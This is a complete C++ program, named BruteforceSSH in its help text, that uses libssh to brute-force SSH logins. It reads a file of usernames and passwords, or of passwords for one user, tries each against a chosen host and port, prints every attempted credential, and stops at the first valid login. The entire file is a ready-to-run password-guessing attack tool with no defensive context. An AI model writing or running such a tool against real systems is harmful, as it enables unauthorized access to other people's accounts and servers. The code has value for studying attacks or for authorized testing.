#include <libssh/libssh.h>

#include <fstream>
#include <iostream>
#include <sstream>
#include <string>

bool connect(const std::string &hostname, int port, const std::string &username, const std::string &password, int timeout) {
    ssh_session session = ssh_new();
    if (session == nullptr) {
        std::cerr << "Error creating SSH session" << std::endl;
        return false;
    }

    ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
    ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "ssh-ed25519,ssh-rsa,ssh-dss");

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        std::cerr << "Error connecting to " << hostname << ": " << ssh_get_error(session) << std::endl;
        ssh_free(session);
        return false;
    }

    rc = ssh_userauth_password(session, nullptr, password.c_str());
    if (rc == SSH_AUTH_SUCCESS) {
        std::cout << "Success: " << username << ":" << password << std::endl;
        ssh_disconnect(session);
        ssh_free(session);
        return true;
    } else {
        std::cerr << "Failure: " << username << ":" << password << std::endl;
        ssh_disconnect(session);
        ssh_free(session);
        return false;
    }
}

bool connect_accounts(const std::string &filename, const std::string &hostname, int port, int timeout) {
    std::ifstream file(filename);
    std::string line;

    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return false;
    }

    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string username;
        std::string password;

        if (std::getline(iss, username, ':') && std::getline(iss, password)) {
            if (connect(hostname, port, username, password, timeout)) {
                return true;
            }
        }
    }
    return false;
}

bool connect_passwords(const std::string &filename, const std::string &username, const std::string &hostname, int port, int timeout) {
    std::ifstream file(filename);
    std::string line;

    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return false;
    }

    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string password;

        if (std::getline(iss, password)) {
            if (connect(hostname, port, username, password, timeout)) {
                return true;
            }
        }
    }
    return false;
}

int main(int argc, char *argv[]) {
    std::string filename;
    std::string username;
    std::string hostname = "localhost";
    int port = 22;
    int timeout = 30;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-f" || arg == "--file") {
            if (i + 1 < argc) {
                filename = argv[++i];
            } else {
                std::cerr << "--file option requires a filename argument." << std::endl;
                return 1;
            }
        } else if (arg == "-u" || arg == "--user") {
            if (i + 1 < argc) {
                username = argv[++i];
            } else {
                std::cerr << "--user option requires a username argument." << std::endl;
                return 1;
            }
        } else if (arg == "-h" || arg == "--host") {
            if (i + 1 < argc) {
                hostname = argv[++i];
            } else {
                std::cerr << "--host option requires a hostname argument." << std::endl;
                return 1;
            }
        } else if (arg == "-p" || arg == "--port") {
            if (i + 1 < argc) {
                port = std::stoi(argv[++i]);
            } else {
                std::cerr << "--port option requires a port number argument." << std::endl;
                return 1;
            }
        } else if (arg == "-t" || arg == "--timeout") {
            if (i + 1 < argc) {
                timeout = std::stoi(argv[++i]);
            } else {
                std::cerr << "--timeout option requires a timeout value (seconds) argument." << std::endl;
                return 1;
            }
        } else if (arg == "--help") {
            std::cout << "Usage: BruteforceSSH [options]" << std::endl;
            std::cout << "Options:" << std::endl;
            std::cout << "  -f, --file <filename>      File" << std::endl;
            std::cout << "  -u, --user <username>      User (optional)" << std::endl;
            std::cout << "  -h, --host <hostname>      Host (default: 127.0.0.1)" << std::endl;
            std::cout << "  -p, --port <port>          Port (default: 22)" << std::endl;
            std::cout << "  -t, --timeout <timeout>    Timeout (seconds, default: 30)" << std::endl;
            std::cout << "  --help                     Print help" << std::endl;
            return 0;
        } else {
            std::cerr << "Unknown option: " << arg << std::endl;
            return 1;
        }
    }

    if (!filename.empty()) {
        if (!username.empty()) {
            if (!connect_passwords(filename, username, hostname, port, timeout)) {
                std::cerr << "No successful authentication found." << std::endl;
                return 1;
            }
        } else {
            if (!connect_accounts(filename, hostname, port, timeout)) {
                std::cerr << "No successful authentication found." << std::endl;
                return 1;
            }
        }
    } else {
        std::cerr << "You must specify a file." << std::endl;
        std::cout << "Use --help for usage information." << std::endl;
        return 1;
    }

    return 0;
}
